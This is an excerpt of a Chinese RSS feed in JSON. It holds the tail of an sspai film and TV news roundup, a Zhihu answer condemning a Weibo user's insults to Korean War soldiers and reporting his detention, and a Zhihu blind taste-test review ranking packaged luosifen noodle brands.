href=\"https://www.bilibili.com/video/BV1QQ4y1Q7uE\" target=\"_blank\"><strong>游戏改 TV 动画《Love Live! 虹咲学园学园偶像同好会》第二季定档</strong></a><strong>：</strong>将于 2022 年 4 月开始播出，同时公开了新人设与主视觉图。</p>\n<h2>📽 影视新闻周报</h2>\n<h3>Apple TV+ 正式续订《基地》第二季</h3>\n<p>Apple TV+ 正式续订《基地》第二季。该剧改编自艾萨克·阿西莫夫创作的科幻小说《基地三部曲》，李·佩斯、杰瑞德·哈里斯主演。首季已于 9 月 24 日开播。</p>\n<h3>英剧《浴血黑帮》将制作电影版</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/c0ebcf00e48f80d310befa2f82ba5096.png\"></figure><p>10 月 7 日，英剧《浴血黑帮》宣布剧终季第六季将于明年春季开播，并确定制作电影版，并将于 2023 年投入制作。电影版的故事将会是整个系列的大结局。</p>\n<h3>台剧《华灯初上》11 月 26 日上线 Netflix</h3>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/08/250ea9a0ab35e21a7e55f0d37f319975.png\"></figure><p>10 月 6 日，台剧《华灯初上》第一季前八集定档 11 月 26 日上线 Netflix。《华灯初上》全剧分三季共 24 集，由连奕琦执导，林心如担任总制作人，林心如、杨谨华、杨祐宁、刘品言、郭雪芙主演，吴慷仁、郑元畅、王柏杰客串出演。</p>\n<h3>西蒙·金伯格执导电影《355》发布全新海报</h3>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/08/54e3b423d601a3dd9831de2285a6a5f9.jpeg\"></figure><p>10 月 8 日，由西蒙·金伯格执导，杰西卡·查斯坦、戴安·克鲁格、露皮塔·尼永奥、佩内洛普·克鲁兹、塞巴斯蒂安·斯坦、埃德加·拉米雷兹等出演的女性间谍题材影片《355》发布全新海报和 <a href=\"https://www.bilibili.com/video/BV16q4y1R7KH\" target=\"_blank\">新正式预告</a>。该片将于 2022 年 1 月 7 日北美上映。</p>\n<h3>更多</h3>\n<p><strong>厄休拉·勒古恩科幻小说《一无所有》将拍成剧集：</strong>10 月 5 日，据媒体报道，厄休拉·勒古恩的科幻小说《一无所有》将拍成剧集，1212 娱乐公司和 Anonymous Content 联手制作。《一无所有》于 1974 年发行，曾获星云奖和雨果奖。</p>\n<p><strong>《新自杀小队》衍生剧集《和平使者》2022 年 1 月上线：</strong>10 月 5 日，电影《新自杀小队》衍生剧集《和平使者》公布了 <a href=\"https://www.bilibili.com/video/BV1hP4y187VB\" target=\"_blank\">首支片段</a>，第一季共 8 集，将于 2022 年 1 月 16 日登陆 HBO Max。本作剧本由导演詹姆斯·古恩撰写，设定在电影之前，约翰·塞纳继续饰演角色和平使者，讲述其起源故事，史蒂夫·阿吉、丹妮埃拉·布鲁克斯、克里斯托弗·赫耶达尔、詹尼佛·霍兰德等亦将出演。 <a href=\"https://twitter.com/hbomax/status/1445317684913115137\">来源</a> </p>\n<h2>🎪 彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/a1bf1480a3953215ac075506c31481e2.jpg\"></figure><p>本期的彩蛋是由中奖读者 <a class=\"ss-atUser\" data-mention=\"@Ta\" user-id=\"c49p245b34tde3i5gm5g\" href=\"https://sspai.com/u/otter\">@Ta</a> 提供的「看图猜电影」，首位猜中片名的读者，可获得彩蛋提供名额 1 次（彩蛋内容包括但不限于「猜电影」「你喜欢的经典影视作品/影人/台词」「电影冷知识」），</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/8cb8009742471e787a0dfa0179eed2da.jpg\"></figure><p>🎁 本期彩蛋还有两道附加题，其中的「关键词猜电影」由读者 <a class=\"ss-atUser\" data-mention=\"@从来没有岁月能长留\" user-id=\"bs2p325b34tch279laig\" href=\"https://sspai.com/u/oi1rpq88\">@从来没有岁月能长留</a> 提供。全部答对的朋友除了彩蛋提供名额，还可以获得少数派周边一份！本期猜中的「第一名」将会在这篇文章中更新，届时也请各位参与互动的朋友注意站内私信~</p>\n<p>🎬 你可能错过：<a href=\"https://sspai.com/post/69093\" target=\"_blank\"><strong>看什么· 特别篇丨这 10 部电影，让你不再错过秋天的短暂赏味期</strong></a><strong> </strong>🍁</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69183"},{"title":"如何看待微博网民@罗昌平 近日针对志愿军烈士发表侮辱言论，目前已被刑拘？","date":"2021-10-08 08:34:15","description":"\n<p><b>辱骂“冰雕连”、污蔑抗美援朝先烈，我们绝不答应！</b></p>\n<p>10月6日，拥有数百万粉丝的某博主在微博上公然侮辱志愿军英烈。微博一出，立刻引发全民声讨。当晚解放军媒体官方微博账号<b>@钧正平</b>发表评论<b>《辱骂“冰雕连”，良心何在！》</b></p>\n<p>随着电影《长津湖》的热映，中国人民志愿军的故事再次引发讨论。抗美援朝战争中志愿军为了合围美军，宁可冻死也不撤出阵地。志愿军“冰雕连”的战斗事迹，每次提起都让人潸然泪下。</p>\n<a href=\"https://www.zhihu.com/video/1429845645876600832\"></a><p>电影原型周全弟是“冰雕连”的幸存者，零下40度的雪地里他趴了三天三夜，四肢全部被冻坏。手术后昏迷七天七夜他却说，<b>“我遗憾没能完成任务。”</b></p>\n<p>从战场上幸存下来这位15岁的少年，却永远地失去了四肢。他克服常人难以想象的困难，重新学习穿衣、吃饭，努力做到生活自理。</p>\n<p>我们怎么能够容忍有人玷污这样的英雄！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fde93d42ff676f05a716c018322d2ebb_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"823\" data-rawheight=\"1175\" data-watermark=\"original\" data-original-src=\"v2-fde93d42ff676f05a716c018322d2ebb\" data-watermark-src=\"v2-a74cc75ef828c1f7ad7ffce2db60d2f7\" data-private-watermark-src=\"v2-13f62049584643d82c3647cd833360bf\"></p>\n<p>一边过着前人舍生忘死换来的幸福生活</p>\n<p>一边昧着良心肆意污蔑志愿军英烈</p>\n<p><b>这种人，良心何在！</b></p>\n<p><b>这种行为</b></p>\n<p><b>我们绝不容忍、绝不答应！</b></p>\n<p><br></p>\n<p><b>最新消息：目前，三亚市公安局吉阳分局已经以涉嫌“侵害英雄烈士名誉、荣誉罪”对其刑事拘留，案件正在进一步办理中。</b></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-tui-yi-jun-ren-80?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国退役军人</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/491084605/answer/2160316092?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">790 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/291493673?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么在烈士新闻底下总有人辱骂烈士或者公务人员？</a><br><a href=\"http://www.zhihu.com/question/325016341?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待近些年来利用侮辱国难英烈为由诱导舆论的行为？</a><br>\n","link":"http://www.zhihu.com/question/491084605/answer/2160316092?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"淘宝上的螺蛳粉哪个牌子最好吃？","date":"2021-10-08 08:31:25","description":"\n<p>过去的两个星期，我下单了近103个品牌100<b>多种</b>螺蛳粉，<b>还专程去了一趟螺蛳粉之都：柳州！！</b>吃遍了能找到的所有品牌，工伤胖五斤！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6b014759b0c217b3bbfa31fcd88b1d19_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6b014759b0c217b3bbfa31fcd88b1d19\" data-watermark-src=\"v2-40655da1b85d13f16b354c1e0afad44f\" data-private-watermark-src=\"v2-819ed923e309f7f6e881b8247adc488b\"></p>\n<p>所有的一切，只有一个目的：<b>挑选出市面上真正好吃的螺蛳粉，推荐给大家！</b></p>\n<p>说明：<b>本文全程无广，且一定是史上最全的螺蛳粉测评。</b></p>\n<blockquote>感谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/9f4fb22e0686450a11c6d5dc122e4888\" data-hash=\"9f4fb22e0686450a11c6d5dc122e4888\" data-hovercard=\"p$b$9f4fb22e0686450a11c6d5dc122e4888\">@知乎生活</a> 邀请。特别开心作为翻牌众测嘉宾，测评超爱的螺蛳粉！</blockquote>\n<p><b>测评开始前：选品</b></p>\n<p>大概用了三天时间，通过各种途径搜罗到了近100种螺蛳粉品牌，下单的那一刻，感受到了从未有过的满足感！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ec7cfa20ec003e91e8a79dc537d28f45_720w.jpg?rss\" data-rawwidth=\"5472\" data-rawheight=\"3648\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ec7cfa20ec003e91e8a79dc537d28f45\" data-watermark-src=\"v2-b97ddae11bae889ff6891d0297ddcd5d\" data-private-watermark-src=\"v2-3ca6a30071e2ac3000524166fb1821a2\"></p>\n<p>为了保证测评维度的统一，没有选择干拌型或者是炒螺蛳粉。另外，【冲泡型螺蛳粉】，因为口感太差，也被我在选品阶段就直接PASS。。 </p>\n<p>全部收到之后开心到模糊，来个大合影！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ae3b412ce8f4ed46ec71e38983db3464_720w.jpg?rss\" data-rawwidth=\"5472\" data-rawheight=\"3648\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ae3b412ce8f4ed46ec71e38983db3464\" data-watermark-src=\"v2-1386bb3f43935c183b52276a3f18a4b9\" data-private-watermark-src=\"v2-59f8a478ce3213f632ff1bb7707f8e04\"></p>\n<p><b>调查：大家觉得什么样的螺蛳粉才好吃？</b></p>\n<p>在开始正式测评之前，我在知乎发了一条想法。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1a25d102f37f379649d0b2779997282d_720w.jpg?rss\" data-rawwidth=\"1125\" data-rawheight=\"1603\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-1a25d102f37f379649d0b2779997282d\" data-watermark-src=\"v2-24ff0a61e517e06be9071ccdcdd5515c\" data-private-watermark-src=\"v2-e4f3148ddbdbee96456df58d92c81ccf\"></p>\n<p>除了感受到大家对螺蛳粉的热情之外，还收获了大家对“一碗什么样的螺蛳粉才好吃？”这件事，百花齐放的见解：</p>\n<ul>\n<li>“一定要辣，也要臭，但不能太咸！</li>\n<li>“辣味不能是太呛喉的那种，一定要是香辣！”</li>\n<li>“粉的口感要足够Q弹。”</li>\n<li>“汤一定要鲜，层次丰富！”</li>\n<li>“希望酸笋、酸豆角这一类的腌制品，香味够天然，而不是一股化学俗成味！”</li>\n</ul>\n<p>层次逐渐丰富，思路越来越清晰，根据大家关心的各个维度，我和大皮皮整理除了一份表格，在试吃过程中打分。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7975846a11ef20a125465ea89496dbf3_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7975846a11ef20a125465ea89496dbf3\" data-watermark-src=\"v2-c00dbaf1a8ff459111bfc4b8807ca41b\" data-private-watermark-src=\"v2-2cd471517801c77915e159ba299674c6\"></p>\n<p>所以，就等着我给大家交出一份满意的答案叭！！</p>\n<p><b>测评步骤：</b></p>\n<p>我们这次的测评分三步。</p>\n<ol>\n<li>试吃买到的所有螺蛳粉，排除掉口感劣质，味道不好，不值得推荐的。</li>\n<li>瞬移到柳州，吃当地最好吃的螺蛳粉。</li>\n<li>再次对比，选出和刚出锅的地道螺蛳粉最接近的。</li>\n</ol>\n<p><br></p>\n<h3>包装螺蛳粉试吃过程：</h3>\n<p>话不多说，这就开泡！</p>\n<p>这次的测评有一个重点：所有人都是 盲吃！！！在吃的过程中，绝对不会有一个人知道，自己此刻吃的到底是哪一个品牌。这样就避免了我们因为对某些品牌先入为主的偏爱，或者是负面印象，而带入印象分！</p>\n<p>我们给每个品牌都编了号码，在试吃之前，把每一包螺蛳粉都拆掉外包装，放进每个品牌相应编号的碗里。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2595b08650eb28300d1e8d02eca217a5_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2595b08650eb28300d1e8d02eca217a5\" data-watermark-src=\"v2-9ba360867db69c1146e38948dbcc0034\" data-private-watermark-src=\"v2-18632b36bef25fd32151a6f9b3d23750\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-34af0de9cf93f130531007044c07179a_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-34af0de9cf93f130531007044c07179a\" data-watermark-src=\"v2-6cbe2518f3ee23cd757d8c843b5e951e\" data-private-watermark-src=\"v2-e0b0096ec007ffd6957332afcb9ef0b9\"></p>\n<p>给这些嗷嗷待煮的螺蛳粉来张合影。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4431b82f740e5b60914a5a614f89a4a5_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4431b82f740e5b60914a5a614f89a4a5\" data-watermark-src=\"v2-780ebda3c22348216ca549d68d15b499\" data-private-watermark-src=\"v2-6354cbdd9fb3d6ab845d19ea75385140\"></p>\n<p>煮粉工具有没有很专业？</p>\n<p><img src=\"https://pic1.zhimg.com/v2-85476441733a1177e292730370768353_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-85476441733a1177e292730370768353\" data-watermark-src=\"v2-3ba47ce9fee62a63588c4df64b32b002\" data-private-watermark-src=\"v2-d1846f1a0966793b525ef44ca5bbebec\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2b9569f9894e6688eb9dc53c5d722732_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2b9569f9894e6688eb9dc53c5d722732\" data-watermark-src=\"v2-1bebab38fb97f55ec313d68849b3944d\" data-private-watermark-src=\"v2-b20e1cd6ab8e0b6ab601cb215e1e1b0f\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-feb466924816c1304776a89fdf489aa8_720w.gif?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-feb466924816c1304776a89fdf489aa8\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>为了效率更高，结果更客观，还特意邀请了【大理嗦粉天团】。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-22cb1876221afdc7a970a15a5cba110b_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-22cb1876221afdc7a970a15a5cba110b\" data-watermark-src=\"v2-22aafef4d0c5c9c018f69d5e0664e6d0\" data-private-watermark-src=\"v2-dc8c1077d76b94ed5697e8e92b8b3a80\"></p>\n<p>他们来自全国各地，口味各有偏好，但都是吃遍大江南北，<b>热爱螺蛳粉</b>的资深吃货。</p>\n<p>看到他们那一张张对螺蛳粉满怀渴望的脸，我就有绝对的信心。我们这群爱吃、懂吃的人挑出的螺蛳粉，绝对不一般！</p>\n<p>从清晨到日落，家里弥漫着不可言说的臭味，我们在臭味中敬业的试吃、记录。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b140458d08faaf6c83976fd8e2c0e0e2_720w.gif?rss\" data-rawwidth=\"850\" data-rawheight=\"478\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-b140458d08faaf6c83976fd8e2c0e0e2\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-3edc287505e4b46edb3b587f891c86a4_720w.gif?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3edc287505e4b46edb3b587f891c86a4\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d5f555d6a9512102c8746a9c835cf617_720w.gif?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d5f555d6a9512102c8746a9c835cf617\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>每一种螺蛳粉都严格按说明煮，包括<b>水量、煮粉时间，各种食材的先后顺序</b>。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8c638e1fabd5a100b8491bc1863eac97_720w.gif?rss\" data-rawwidth=\"729\" data-rawheight=\"410\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8c638e1fabd5a100b8491bc1863eac97\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>经过这一轮，已经有一大批选手，因为口味、口感、品质的原因，而惨遭淘汰。</p>\n<h2>开始柳州寻味之旅：</h2>\n<p>留着幸存螺蛳粉品牌的味蕾记忆，一刻也不能耽误，我们一家人，带着螺蛳粉的酸臭，马不停蹄的踏上了去柳州的旅程。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2087c11ddf81f108cc2bb86acc306150_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2087c11ddf81f108cc2bb86acc306150\" data-watermark-src=\"v2-f4b2f9df5d7fff5701e3a8cdb4d73d2f\" data-private-watermark-src=\"v2-81dcb8123fedfd0496d89a2718541772\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-35aae4c5f48234cc2d88331059d89ee1_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-35aae4c5f48234cc2d88331059d89ee1\" data-watermark-src=\"v2-2e2c90ab6e88bb68005dc0b25a1983c6\" data-private-watermark-src=\"v2-52c89ba5b0b6937895d74552f0e5ef04\"></p>\n<p>根据提前做好的功课、我们在柳州吃了8家网红粉店。</p>\n<p>它们分别是：</p>\n<p><b>西环肥仔、聚宝、罗忆、娇姐、凤张、金旺、翠翠家，和路边的一家不知明小店。</b></p>\n<p>除了一家踩雷，其他的每一家都好吃得各有特色。店里吃到的螺蛳粉，<b>汤底层次丰富，香、辣、咸、甜、鲜、配菜丰富又新鲜</b>。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1c22fe67947c6a6e78f64c6f8312e16b_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-1c22fe67947c6a6e78f64c6f8312e16b\" data-watermark-src=\"v2-21f7ce1afb8ecf09e3390f405b2be99a\" data-private-watermark-src=\"v2-73ea4eab45e61db2323b2e0cbb7a193b\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2c9e0501c1866f9ff7124b8a282124be_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2c9e0501c1866f9ff7124b8a282124be\" data-watermark-src=\"v2-8a0153f51456c78edd2c2b58b7678984\" data-private-watermark-src=\"v2-6b15b13fa727da884b92164e575da0c6\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0935c2521580b523afe950ffca96c5ee_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0935c2521580b523afe950ffca96c5ee\" data-watermark-src=\"v2-8038f848390ba4f0a3ddee14fdce5d39\" data-private-watermark-src=\"v2-437e14ba6d8459350ff9f2d5dd399a2f\"></p>\n<p>我们连着吃了好多顿也不腻，在来往于各个螺蛳粉店的出租车上，我和大皮皮感慨：螺蛳粉真是个很棒的食物！层次丰富、回味无穷，很难吃腻！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-000cc04efd4e361b32dd48f933a6a1d4_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-000cc04efd4e361b32dd48f933a6a1d4\" data-watermark-src=\"v2-f00d8b736e6cd49495d13e700ed96755\" data-private-watermark-src=\"v2-d8fbf4f5827e2442a675d329366d48ae\"></p>\n<p>在探店过程中，刚好遇到凤张的老板在店里，赶紧抓住机会采访了一下。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3c6280935818afdb52043f8ded1d0bb6_720w.gif?rss\" data-rawwidth=\"753\" data-rawheight=\"424\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3c6280935818afdb52043f8ded1d0bb6\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>老板人很好，毫无保留的向我们道出了螺蛳粉好吃的精髓与秘籍：</p>\n<blockquote>\n<b>汤底一定要用骨头搭配螺蛳，再加上丰富的香料一起熬制，咸香十足，回味无穷。</b><br><b>泡制的螺蛳确实有臭味，但每天备用的酸笋都会提前炒香，“香臭”完美融合，并不是单纯的臭。</b><br><b>腐竹薄一些口感更好，并且一定要用品质好的油来炸，保证没有怪味。</b><br><b>花生米一定要新鲜、香脆，火候必须控制好。</b>\n</blockquote>\n<p><img src=\"https://pic2.zhimg.com/v2-c8056d364ce6fa616b98c9b9e5c1c8fc_720w.gif?rss\" data-rawwidth=\"797\" data-rawheight=\"448\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-c8056d364ce6fa616b98c9b9e5c1c8fc\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<h2>测评结果来啦！！！：</h2>\n<p>带着在柳州深度品尝，和采访螺蛳粉店老板所得出的这份秘籍，和最直接的试吃感受，我们再次回到大理，综合：<b>米粉口感、酸笋的味道、汤底层次、配菜的丰富程度，以及个人评分和推荐程度。</b>我们总结出了一份骨灰级贴心的推荐表格。</p>\n<p>推荐之前要说明一件事。很多人说，网上买的包装螺蛳粉比起在柳州店里吃的，差太多太远。但我认真品尝之后得出的结论并不是如此。</p>\n<p>网购的包装螺蛳粉，如果品质过关，其实在<b>汤底的味道上，完全可以做到还原</b>。有差别的只是配菜丰富度，和配菜的口感。总的来说，只要选对了，包装螺蛳粉的味道也并不差！</p>\n<p>这里分<b>【好吃必买榜】、【拉黑避雷榜】</b>和<b>【可以一试】</b>三个纬度给大家列出表格。至于一些味道太过于平庸，不值一提，也没有明显槽点的品牌，就直接忽略了。</p>\n<p><b>好吃必买推荐榜：</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8e719b5571715e9b8d570ef912c55ac4_720w.jpg?rss\" data-rawwidth=\"3675\" data-rawheight=\"2558\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8e719b5571715e9b8d570ef912c55ac4\" data-watermark-src=\"v2-3d333071aa1c9284d3755672e24ae124\" data-private-watermark-src=\"v2-f1c8a29d8475abe0a250ea3bc6f3e399\"></p>\n<p>这些被推选上<b>【必买榜单】</b>的牌子，都是首先惊艳评委们的味蕾，又被大家反复品尝、分析、回味，最终被一致认可的。拍胸脯说，只要你爱吃螺蛳粉，都可以闭眼买，不会踩雷！！</p>\n<p><b>1、螺霸王菌菇味</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-33ee621b78ea0c46cf2512a88378f5ef_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-33ee621b78ea0c46cf2512a88378f5ef\" data-watermark-src=\"v2-55c12f0de1c52279b616db81a2cdcfbb\" data-private-watermark-src=\"v2-bfc59b11d399d8318f465d5e347979e5\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-be3b8f04e23458b012cbd41e9d063d5c_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-be3b8f04e23458b012cbd41e9d063d5c\" data-watermark-src=\"v2-db586698aa15e36a52948c2c8b6ec0ad\" data-private-watermark-src=\"v2-efcd6e76d4d3629634d518402d10fa0a\"></p>\n<p>如果不是粉丝特别推荐，差点就错过，因为从包装来看，实在不像好吃的样子。但实际上这是最受大家好评的一包。</p>\n<p>有菌菇包是其次，关键是<b>整碗粉的味道都超级好</b>！可以说是一百多碗里最好吃的一碗了。<b>香香辣辣，汤头层次丰富</b>，喝起来既特别又过瘾。除了非常丰富的配菜，还有蛋白条和菌菇包。菌菇是酸脆的，味道和汤底本味融合在一起很和谐。木耳和酸笋也很脆。总之味道和口感都超级赞！收获了好几位评委的满分推荐！</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429829991610032128\"></a><p><b>2、柳江人家</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-af69cea6bb4588cc756b922716168936_720w.jpg?rss\" data-rawwidth=\"1269\" data-rawheight=\"846\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-af69cea6bb4588cc756b922716168936\" data-watermark-src=\"v2-f5a03de2bc8aec400203c9c68f20fcf4\" data-private-watermark-src=\"v2-f4c1c95bb34fc0bde6e4ebc90c7d2a2f\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-45c2833bd6e8b54aa6c97db9ae7f84bf_720w.jpg?rss\" data-rawwidth=\"1268\" data-rawheight=\"713\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-45c2833bd6e8b54aa6c97db9ae7f84bf\" data-watermark-src=\"v2-d0c1784630837f4156bb4763bef22218\" data-private-watermark-src=\"v2-db4677c9826bbec737ebb9fcec777c16\"></p>\n<p>同上，整体味道就是很棒！很辣很鲜好吃。汤底味道很丰富，<b>麻辣鲜香搭配得恰到好处</b>，喝一口汤就回味无穷。并且粉丝Q弹，腐竹也超级新鲜，有股清甜的豆香味，香脆的腐竹吸上层次饱满的汤汁，入口超级过瘾！<b>麻辣爱好者推荐！</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429830658559008768\"></a><p><b>3.螺行江湖</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-03d1beb9170fa086b8e2cf676ace0c77_720w.jpg?rss\" data-rawwidth=\"1269\" data-rawheight=\"846\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-03d1beb9170fa086b8e2cf676ace0c77\" data-watermark-src=\"v2-80a216c9ab2df6cbbd626429477ec5f3\" data-private-watermark-src=\"v2-a8a3e41ecbab9f195040fc6279da5bbe\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-141f6ee390a66842bf78cf6984606b49_720w.jpg?rss\" data-rawwidth=\"1268\" data-rawheight=\"713\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-141f6ee390a66842bf78cf6984606b49\" data-watermark-src=\"v2-1b6d7d6c484e5f699a682938eb5b01f7\" data-private-watermark-src=\"v2-b9e0f2eabd183bc7accc0bab581b969f\"></p>\n<p>这碗的风格比较刺激，辣得挺爽的，有大粒的螺肉，并且处理得非常好，螺蛳的香突出，却没有明显的腥味。汤底的味道也很正宗，整体好评。如果木耳再新鲜香脆一些，就完美了。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429831115729657856\"></a><p><b>4.柳螺宗蛳</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-783c54c419262354785a04460cc35f2e_720w.jpg?rss\" data-rawwidth=\"1269\" data-rawheight=\"846\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-783c54c419262354785a04460cc35f2e\" data-watermark-src=\"v2-f3d82e7d901ebe08856bf2a8a5b13407\" data-private-watermark-src=\"v2-51aa56c562560d49ec6100b0a1b8cddb\"></p>\n<p><br></p>\n<p><img 